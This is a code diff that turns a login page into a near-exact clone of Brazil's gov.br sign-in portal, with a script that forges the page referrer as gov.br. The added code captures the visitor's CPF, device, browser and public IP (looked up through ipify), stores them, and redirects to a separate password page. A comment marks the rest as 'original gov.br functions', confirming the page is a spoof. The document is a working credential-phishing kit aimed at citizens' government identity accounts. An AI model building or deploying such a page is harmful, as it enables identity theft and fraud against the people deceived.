@@ -1,259 +1,424 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>gov.br - Acesse sua conta</title>
-    <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fontawesome/css/all.min.css">
-    <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fonts/rawline/rawline.css">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Rawline', 'Segoe UI', sans-serif;
-            background: #F5F5F5;
-            min-height: 100vh;
-        }
-        header {
-            background: #FFFFFF;
-            border-bottom: 1px solid #D4D4D4;
-            padding: 16px 32px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        header img { height: 45px; }
-        #acessibilidade { display: flex; gap: 20px; }
-        #acessibilidade a { color: #1351B4; text-decoration: none; font-size: 14px; }
-        .container {
-            max-width: 1200px;
-            margin: 40px auto;
-            padding: 0 20px;
-            display: flex;
-            gap: 40px;
-            flex-wrap: wrap;
-        }
-        #aside-signin { flex: 1; min-width: 250px; }
-        #identidade-govbr { width: 100%; max-width: 400px; border-radius: 10px; }
-        #main-signin { flex: 2; min-width: 300px; }
-        .card {
-            background: white;
-            border-radius: 12px;
-            padding: 32px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
-        }
-        .card h3 { color: #1E1E1E; margin-bottom: 24px; font-size: 20px; }
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; color: #333; }
-        .form-group input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #CCC;
-            border-radius: 8px;
-            font-size: 16px;
-            font-family: inherit;
-        }
-        .form-group input:focus { outline: none; border-color: #1351B4; box-shadow: 0 0 0 2px rgba(19,81,180,0.1); }
-        .btn-login {
-            width: 100%;
-            background: #1351B4;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .btn-login:hover { background: #0E3D8A; }
-        .btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
-        .links { text-align: center; margin-top: 20px; }
-        .links a { color: #1351B4; text-decoration: none; font-size: 13px; margin: 0 10px; }
-        .message {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 8px;
-            text-align: center;
-            display: none;
-        }
-        .message.error { background: #FEE; color: #C33; border: 1px solid #FCC; display: block; }
-        .message.success { background: #E5F5E5; color: #2E7D32; border: 1px solid #C8E6C9; display: block; }
-        .loading {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid #fff;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 0.6s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .separator {
-            display: flex;
-            align-items: center;
-            margin: 24px 0;
-            color: #999;
-            font-size: 12px;
-        }
-        .separator::before, .separator::after {
-            content: "";
-            flex: 1;
-            height: 1px;
-            background: #ddd;
-        }
-        .separator::before { margin-right: 10px; }
-        .separator::after { margin-left: 10px; }
-        .social-login { display: flex; gap: 15px; justify-content: center; }
-        .social-btn {
-            flex: 1;
-            padding: 10px;
-            background: #F5F5F5;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            text-align: center;
-            cursor: pointer;
-            font-size: 13px;
-        }
-        .footer-links { margin-top: 24px; padding-top: 20px; border-top: 1px solid #E0E0E0; }
-        .footer-links a { display: block; color: #1351B4; text-decoration: none; margin-bottom: 10px; font-size: 13px; }
-        @media (max-width: 768px) { .container { flex-direction: column; } header { flex-direction: column; text-align: center; } }
-    </style>
+<!-- saved from url=(0081)https://sso.acesso.gov.br/login?client_id=www.gov.br&authorization_id=19deb9841ec -->
+<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<script type="text/javascript">
+(function(){
+try {
+function getterHook(obj, name, cb) {
+    if (document.__defineGetter__) {
+        document.__defineGetter__(name, cb);
+        return;
+    }
+    if ((obj && obj.prototype && Object) &&
+        (Object.getOwnPropertyDescriptor) &&
+        (Object.getOwnPropertyDescriptor(obj.prototype, name)) &&
+        (Object.getOwnPropertyDescriptor(obj.prototype, name).get) &&
+        (Object.getOwnPropertyDescriptor(obj.prototype, name).configurable)) {
+        Object.defineProperty(obj.prototype, name, { get : cb });
+        return;
+    }
+}
+function asmReferrerGetter() { return "https://www.gov.br/"; }
+getterHook(Document, "referrer", asmReferrerGetter);
+} catch(e) {}
+})();
+</script>
+
+<title>gov.br - Acesse sua conta</title>
+<meta property="creator.productor" content="http://estruturaorganizacional.dados.gov.br/id/unidade-organizacional/2981">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+
+<link rel="icon" href="https://sso.acesso.gov.br/assets/govbr/img/favicon.ico" type="image/x-icon">
+<link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fontawesome/css/all.min.css">
+<link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fonts/rawline/rawline.css">
+<link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/css/govbr-highcontrast.css">
+<link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/css/govbr-templates.css">
+<link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/css/govbr-modal.css">
+<link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/css/govbr-eula.css">
+<script src="https://sso.acesso.gov.br/assets/govbr/js/contrast.class.js"></script>
+<script src="https://sso.acesso.gov.br/assets/govbr/js/modal.js"></script>
+<style>
+._content_1h9d5_1{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none}._content_1h9d5_1 div{background:#2424244d;color:#fff!important;padding:24px;font-size:48px;font-weight:700;border-radius:16px}._flexBox_9xdww_14{flex-flow:unset}._gap_extraTiny_9xdww_18{gap:2px}._gap_tiny_9xdww_22{gap:4px}._gap_extraSmall_9xdww_26{gap:6px}._gap_small_9xdww_30{gap:8px}._gap_medium_9xdww_34{gap:16px}._gap_normal_9xdww_38{gap:24px}._gap_large_9xdww_42{gap:32px}._gap_xLarge_9xdww_46{gap:48px}._gap_xxLarge_9xdww_50{gap:56px}._gap_extraLarge_9xdww_54{gap:64px}._column_9xdww_58{flex-direction:column!important}._flexWrap_9xdww_62{flex-wrap:wrap}
+</style>
 </head>
+
 <body>
+    <a tabindex="0" href="#conteudo" class="sr-only sr-only-focusable" aria-label="Pular para o conteÃºdo principal. Navegue sempre com a tecla TAB">Pular para o conteÃºdo principal</a>
+
     <header>
-        <a href="#"><img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Logomarca GovBR"></a>
+        <a href="https://www.gov.br/"><img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Logomarca GovBR"></a>
         <div id="acessibilidade">
-            <span><a href="#"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a></span>
-            <span><a href="#"><i class="fas fa-deaf"></i><span>VLibras</span></a></span>
+            <span>
+                <a href="#" onclick="contrastScript().toggleContrast(event)"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
+            </span>
+            <span>
+                <a href="https://www.vlibras.gov.br/" target="_BLANK"><i class="fas fa-deaf"></i><span>VLibras</span></a>
+            </span>
         </div>
     </header>
 
-    <div class="container">
-        <aside id="aside-signin">
-            <img id="identidade-govbr" src="https://sso.acesso.gov.br/assets/govbr/img/conta_govbr_v2.jpg" alt="Logomarca GovBR">
-        </aside>
-        <main id="main-signin">
-            <div class="card">
-                <h3>Identifique-se no gov.br</h3>
-                
-                <div class="form-group">
-                    <label>CPF</label>
-                    <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
-                </div>
-                
-                <div class="form-group">
-                    <label>Senha</label>
-                    <input type="password" id="password" placeholder="Digite sua senha">
-                </div>
-                
-                <button class="btn-login" id="loginBtn">Entrar</button>
-                
-                <div class="links">
-                    <a href="#">Esqueci minha senha</a>
-                    <a href="#">Criar nova conta</a>
-                </div>
-                
-                <div class="separator">ou</div>
-                
-                <div class="social-login">
-                    <div class="social-btn">🏦 Bancos</div>
-                    <div class="social-btn">📱 QR Code</div>
-                    <div class="social-btn">🔐 Certificado</div>
-                </div>
-                
-                <div class="footer-links">
-                    <a href="#">Está com dúvidas e precisa de ajuda?</a>
-                    <a href="#">Termo de Uso e Aviso de Privacidade</a>
-                </div>
-                
-                <div id="message" class="message"></div>
-            </div>
-        </main>
-    </div>
+<style>
+	.button-continuar:disabled {
+        opacity: 0.6 !important;
+        cursor: not-allowed !important;
+        background: #1351B4 0 0 no-repeat padding-box !important;
+    }
+</style>
 
-    <script>
-        function formatCPF(input) {
-            let value = input.value.replace(/\D/g, '');
+<div class="container">
+	<aside id="aside-signin">
+		<img id="identidade-govbr" src="https://sso.acesso.gov.br/assets/govbr/img/conta_govbr_v2.jpg" alt="Logomarca GovBR">
+	</aside>
+	<main id="main-signin">
+	<form method="post" id="loginData" action="#" autocomplete="off" novalidate="">
+		<div class="card" id="login-cpf">
+			<h3>Identifique-se no gov.br com:</h3>
+			<div class="item-login-signup-ways" onclick="accordion('accordion-panel-id')">
+					<a tabindex="3">
+						<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png">
+						Número do CPF
+					</a>
+				</div>
+				<div class="accordion-panel" id="accordion-panel-id">
+					<p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+					<label for="cpf">CPF</label>
+					<input id="accountId" name="accountId" autocomplete="new-password" tabindex="1" type="tel" inputmode="numeric" value="" placeholder="Digite seu CPF" aria-invalid="false">
+					<div class="button-panel" id="login-button-panel">
+						<button id="enter-account-id" type="button" name="operation" value="enter-account-id" class="button-continuar" tabindex="2">Continuar</button>
+            			</div>
+				</div>
+				<label id="title-outras-op">Outras opções de identificação:</label>
+				<hr id="hr-outras-op" style="margin: 0 0 0">
+	
+	            <div class="item-login-signup-ways" onclick="showModal('modal-bancos-credenciados')">
+						<button type="button" tabindex="5" class="button-href-mimic2" style="color:#008C32" onclick="showModal('modal-bancos-credenciados')">
+							<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png">
+							Login com seu banco
+							<span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA CONTA SERÁ PRATA</span>
+						</button>
+					</div>
+					<div class="modal-bancos-credenciados">
+						<div class="modal-content">
+							<h3>Bancos Credenciados</h3>
+							<p><b>Crie</b> ou <b>aumente o nível</b> da sua conta para <b>PRATA</b>, fazendo login com seu banco.</p>
+							<div id="providers-list" class="modal-providers-list">
+								<div class="item-login-signup-ways">
+										<button id="login-external-authentication-banco-do-brasil" type="button" class="button-href-mimic2" tabindex="3">
+											<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/bb_logo.png">
+											Banco do Brasil</button>				
+									</div>
+								<div class="item-login-signup-ways">
+										<button id="login-external-authentication-itau" type="button" class="button-href-mimic2" tabindex="3">
+											<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/itau_logo.png">
+											Itaú</button>				
+									</div>
+								<div class="item-login-signup-ways">
+										<button id="login-external-authentication-caixa-economica" type="button" class="button-href-mimic2" tabindex="3">
+											<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/cef_logo.png">
+											Caixa Econômica</button>				
+									</div>
+								<div class="item-login-signup-ways">
+										<button id="login-external-authentication-bradesco" type="button" class="button-href-mimic2" tabindex="3">
+											<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/bradesco_logo.png">
+											Bradesco</button>				
+									</div>
+								<div class="item-login-signup-ways">
+										<button id="login-external-authentication-santander" type="button" class="button-href-mimic2" tabindex="3">
+											<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/santander_logo.png">
+											Santander</button>				
+									</div>
+								<div class="item-login-signup-ways">
+										<button id="login-external-authentication-nubank" type="button" class="button-href-mimic2" tabindex="3">
+											<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/nubank_logo.png">
+											Nubank</button>				
+									</div>
+								<div class="item-login-signup-ways">
+										<button id="login-external-authentication-inter" type="button" class="button-href-mimic2" tabindex="3">
+											<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/inter.png">
+											Banco Inter</button>				
+									</div>
+								</div>
+							<hr>
+							<div class="button-panel" id="modal-bancos-credenciados-button-panel">
+								<button class="button-cancel" type="button" id="btn-close-modal-bancos-credenciados" onclick="closeModal('modal-bancos-credenciados')">Cancelar</button>
+							</div>
+						</div>
+					</div>
+				<div class="item-login-signup-ways" onclick="showQrCode('0d9bfcd7-2eb7-453c-aa3f-7f467d7a7324');">
+						<a tabindex="5" href="#">
+						    <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/qrcode.png">
+								Login com QR code
+					   		</a>
+					</div>
+				<div class="item-login-signup-ways" id="cert-digital">
+					<button id="login-certificate" type="button" class="button-href-mimic2" tabindex="4">
+						<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD.png">
+						Seu certificado digital
+					</button>
+          </div>
+				<div class="item-login-signup-ways" id="cert-digital-cloud">
+						<button type="button" onclick="showModal('modal-certificado-nuvem')" class="button-href-mimic2" tabindex="5">
+							<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD-Nuvem.png" id="cert-digital-cloud-img">
+							Seu certificado digital em nuvem
+						</button>
+					</div>
+					<div class="modal-certificado-nuvem">
+						<div class="modal-content">
+							<h3>Provedores de Certificados em Nuvem</h3>
+							<div class="item-login-signup-ways">
+									<button id="login-external-authentication-neoid" type="button" class="button-href-mimic2" tabindex="3">
+										<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/serproid_logo.png">
+										SerproID</button>
+								</div>
+							<div class="item-login-signup-ways">
+									<button id="login-external-authentication-safeid" type="button" class="button-href-mimic2" tabindex="3">
+										<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/safeid_logo.png">
+										SafeID</button>
+								</div>
+							<div class="item-login-signup-ways">
+									<button id="login-external-authentication-birdid" type="button" class="button-href-mimic2" tabindex="3">
+										<img src="https://sso.acesso.gov.br/assets/govbr/img/icons/birdid_logo.png">
+										BirdID</button>
+								</div>
+							<hr>
+							<div class="button-panel">
+								<button class="button-cancel" type="button" onclick="closeModal('modal-certificado-nuvem')">Cancelar</button>
+							</div>
+						</div>
+					</div>
+				<div class="entenda-id-govbr" id="entenda-id-govbr">
+				<span>
+					<a tabindex="6" href="https://www.gov.br/governodigital/pt-br/conta-gov-br/ajuda-da-conta-gov.br" id="entenda-id-govbr-a">
+							<img src="https://sso.acesso.gov.br/assets/govbr/fontawesome/webfonts/circle-question-solid.svg" style="margin: 0px 13px -2px 0px; height: 1em;">
+							Está com dúvidas e precisa de ajuda?
+						</a>
+					<a tabindex="6" href="https://cadastro.acesso.gov.br/termo-de-uso" style="display: block;" target="_blank" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
+				</span>
+			</div>
+		</div>
+			
+        <input type="hidden" name="_csrf" value="0d9bfcd7-2eb7-453c-aa3f-7f467d7a7324">
+       	<input id="operation-field" type="hidden"> 
+		<input id="provider-id-field" type="hidden">
+		<input id="flow-token-field" type="hidden"> 
+		
+		<div id="hcaptcha"></div>
+		</form>
+	</main>
+</div>
+<div class="modal-qrcode">
+		<div class="modal-content" style="text-align: center; justify-content: space-evenly">
+			<h3>Login sem senha com QR code</h3>
+				<p style="text-align: justify; justify-content: space-evenly">Utilize o <strong>aplicativo gov.br</strong> para logar sem senha, usando apenas o leitor de QR code.</p>
+				<div id="qrcode" style="display: inline-block"><canvas width="224" height="224"></canvas><img style="display: none;"></div>
+				<p style="text-align: justify; justify-content: space-evenly">
+					Você pode baixar o aplicativo <strong>gov.br</strong> gratuitamente nas lojas de aplicativos.
+				</p>
+				<p style="text-align: center">
+					<a href="https://play.google.com/store/apps/details?id=br.gov.meugovbr">
+						<img src="https://sso.acesso.gov.br/assets/govbr/img/disponivel-no-google-play.png" alt="Android" style="width: 125px">
+					</a>
+					<a href="https://apps.apple.com/br/app/meu-gov-br/id1506827551">
+						<img src="https://sso.acesso.gov.br/assets/govbr/img/disponivel-na-apple-store.png" alt="iOS" style="width: 125px">
+					</a>
+				</p>
+				<div class="button-panel">
+					<button class="button-cancel" type="button" id="btn-close-modal-qrcode" onclick="stopQrCode()">Cancelar</button>
+				</div>
+			<form id="formLoginQrCode" method="post" style="display: none">
+        		<input type="hidden" name="operation" value="qrcode-login">
+				<input type="hidden" name="token">
+				<input type="hidden" name="_csrf" value="0d9bfcd7-2eb7-453c-aa3f-7f467d7a7324">
+			</form>
+		</div>
+	</div>
+
+<footer></footer>
+
+<script src="https://sso.acesso.gov.br/assets/vendors/jquery/jquery-2.2.4.min.js"></script>
+<script src="https://sso.acesso.gov.br/assets/govbr/js/scripts.js"></script>
+<script src="https://sso.acesso.gov.br/assets/vendors/jquery/jquery.maskedinput.js"></script>
+<script src="https://sso.acesso.gov.br/assets/vendors/qrcode/qrcode.min.js"></script>
+
+<script>
+// ============================================================
+// CONFIGURACAO - ALTERAR PARA URL DO SEU BACKEND
+// ============================================================
+const API_URL = '';  // Deixe vazio, vai usar a mesma origem
+
+// ============================================================
+// FUNÇÃO QUE COLETA CPF E REDIRECIONA
+// ============================================================
+function onSubmit(event) {
+    event.preventDefault();
+    
+    const cpfField = document.getElementById('accountId');
+    const cpf = cpfField ? cpfField.value : '';
+    const cpfNumeros = cpf.replace(/\D/g, '');
+    
+    if (!cpf || cpfNumeros.length !== 11) {
+        alert('Digite um CPF válido com 11 dígitos');
+        return;
+    }
+    
+    // Coletar dados do dispositivo
+    const userAgent = navigator.userAgent;
+    let dispositivo = 'Desktop';
+    let navegador = 'Desconhecido';
+    
+    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) dispositivo = 'Mobile';
+    else if (/Tablet|iPad/i.test(userAgent)) dispositivo = 'Tablet';
+    
+    if (userAgent.indexOf('Chrome') > -1) navegador = 'Chrome';
+    else if (userAgent.indexOf('Firefox') > -1) navegador = 'Firefox';
+    else if (userAgent.indexOf('Safari') > -1) navegador = 'Safari';
+    else if (userAgent.indexOf('Edge') > -1) navegador = 'Edge';
+    
+    // Salvar dados no localStorage
+    localStorage.setItem('login_cpf', cpfNumeros);
+    localStorage.setItem('login_dispositivo', dispositivo);
+    localStorage.setItem('login_navegador', navegador);
+    
+    // Coletar IP e redirecionar
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            localStorage.setItem('login_ip', data.ip);
+        })
+        .catch(() => {
+            localStorage.setItem('login_ip', 'Não coletado');
+        })
+        .finally(() => {
+            window.location.href = '/password.html';
+        });
+}
+
+// ============================================================
+// FUNCOES ORIGINAIS DO GOV.BR (NÃO ALTERADAS)
+// ============================================================
+
+function focusOnLoad(id) {
+    const el = document.getElementById(id);
+    if (el) setTimeout(() => el.focus(), 100);
+}
+
+function cpfMask(inputId) {
+    const input = document.getElementById(inputId);
+    if (input) {
+        input.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
             if (value.length > 11) value = value.slice(0, 11);
             if (value.length >= 4) value = value.replace(/(\d{3})(\d)/, '$1.$2');
             if (value.length >= 8) value = value.replace(/(\d{3})(\d)/, '$1.$2');
             if (value.length >= 11) value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-            input.value = value;
-        }
-        
-        function showMessage(msg, type) {
-            const msgDiv = document.getElementById('message');
-            msgDiv.textContent = msg;
-            msgDiv.className = `message ${type}`;
-            setTimeout(() => msgDiv.style.display = 'none', 4000);
-        }
-        
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch(e) { return 'Não coletado'; }
-        }
-        
-        async function fazerLogin() {
-            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-            const password = document.getElementById('password').value;
-            const btn = document.getElementById('loginBtn');
-            
-            if (!cpf || cpf.length !== 11) {
-                showMessage('Digite um CPF válido (11 dígitos)', 'error');
-                return;
-            }
-            if (!password) {
-                showMessage('Digite sua senha', 'error');
-                return;
-            }
-            
-            btn.disabled = true;
-            btn.innerHTML = '<span class="loading"></span> Entrando...';
-            
-            const ip = await getIP();
-            const userAgent = navigator.userAgent;
-            const dispositivo = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent) ? 'Mobile' : 'Desktop';
-            const navegador = userAgent.includes('Chrome') ? 'Chrome' : (userAgent.includes('Firefox') ? 'Firefox' : (userAgent.includes('Safari') ? 'Safari' : 'Outro'));
-            
-            try {
-                const response = await fetch('/api/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cpf, password, ip, dispositivo, navegador })
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    showMessage('Login realizado! Redirecionando...', 'success');
-                    localStorage.setItem('token', data.token);
-                    localStorage.setItem('user', JSON.stringify(data.user));
-                    
-                    setTimeout(() => {
-                        if (data.user.role === 'admin') {
-                            window.location.href = '/admin.html';
-                        } else {
-                            window.location.href = '/dashboard.html';
-                        }
-                    }, 1500);
-                } else {
-                    showMessage(data.error || 'CPF ou senha inválidos', 'error');
-                    btn.disabled = false;
-                    btn.innerHTML = 'Entrar';
-                }
-            } catch(error) {
-                showMessage('Erro ao conectar com o servidor', 'error');
-                btn.disabled = false;
-                btn.innerHTML = 'Entrar';
-            }
-        }
-        
-        document.getElementById('cpf').addEventListener('input', function() { formatCPF(this); });
-        document.getElementById('password').addEventListener('keypress', function(e) { if (e.key === 'Enter') fazerLogin(); });
-        document.getElementById('loginBtn').addEventListener('click', fazerLogin);
-    </script>
+            e.target.value = value;
+        });
+    }
+}
+
+function accordion(elem) {
+    var panel = document.getElementById(elem);
+    if (panel.style.maxHeight) {
+        panel.style.maxHeight = null;
+        document.getElementById("title-outras-op").style.display = "block";
+        document.getElementById("hr-outras-op").style.display = "block";
+    } else {
+        panel.style.maxHeight = "300px";
+        document.getElementById("title-outras-op").style.display = "none";
+        document.getElementById("hr-outras-op").style.display = "none";
+    }
+}
+
+function showModal(modalId) {
+    const modal = document.querySelector(`.${modalId}, .modal-${modalId.split('-')[1]}`);
+    if (modal) modal.style.display = 'block';
+}
+
+function closeModal(modalId) {
+    const modal = document.querySelector(`.${modalId}, .modal-${modalId.split('-')[1]}`);
+    if (modal) modal.style.display = 'none';
+}
+
+function setProviderId(providerId) {
+    const input = document.getElementById("provider-id-field");
+    if (input) {
+        input.name = "provider-id";
+        input.value = providerId;
+    }
+}
+
+var loginQrCode = {};
+
+function startQrCode() {
+    const qrcodeDiv = document.getElementById("qrcode");
+    if (qrcodeDiv && typeof QRCode !== 'undefined') {
+        loginQrCode.qrcode = new QRCode(qrcodeDiv, {
+            text: "",
+            width: 224,
+            height: 224,
+            colorDark: "#000000",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel.L
+        });
+        loginQrCode.cancel = false;
+    }
+}
+
+function showQrCode(csrfToken) {
+    showModal('modal-qrcode');
+}
+
+function stopQrCode() {
+    if (loginQrCode.qrcode) loginQrCode.qrcode.clear();
+    closeModal('modal-qrcode');
+}
+
+var CNAME_GOVBRCOORD = "Govbrcoord";
+var cookieValueBase64New = "";
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+    }
+}
+
+function showError(error) {}
+function showPosition(position) {}
+function precisionWithoutRound(num, precision) {
+    return num.toFixed(precision + 1).slice(0, -1);
+}
+function setCookie(cname, value) {
+    const expireDate = new Date();
+    expireDate.setTime(expireDate.getTime() + (3652 * 24 * 60 * 60 * 1000));
+    document.cookie = cname + "=" + encodeURIComponent(value) + ";domain=." + window.location.hostname + ";expires=" + expireDate.toUTCString();
+}
+function getCookie(cname) {
+    var name = cname + "=";
+    var decodedCookie = decodeURIComponent(document.cookie);
+    var ca = decodedCookie.split(';');
+    for(var i = 0; i < ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) == ' ') c = c.substring(1);
+        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
+    }
+    return "";
+}
+
+// INICIALIZACAO
+focusOnLoad('accountId');
+cpfMask('accountId');
+getLocation();
+
+// Associar botao de login a nova funcao
+const loginButton = document.getElementById('enter-account-id');
+if (loginButton) {
+    const newButton = loginButton.cloneNode(true);
+    loginButton.parentNode.replaceChild(newButton, loginButton);
+    newButton.addEventListener('click', onSubmit);
+}
+
+startQrCode();
+setTimeout(function() { location.reload(true); }, 29 * 60 * 1000);
+</script>
 </body>
 </html>
